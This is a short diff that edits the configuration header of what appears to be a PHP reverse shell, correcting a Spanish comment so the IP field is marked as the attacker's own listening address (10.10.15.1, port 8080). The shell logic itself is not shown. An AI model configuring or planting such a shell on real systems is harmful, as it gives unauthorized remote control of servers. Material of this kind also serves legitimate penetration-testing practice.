@@ -11,7 +11,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.15.1';  // CAMBIAR: IP VÍCTIMA
+$ip = '10.10.15.1';  // CAMBIAR: NUESTRA IP
 $port = 8080;       //  CAMBIAR: PUERTO EN ESCUCHA
 $chunk_size = 1400;
 $write_a = null;
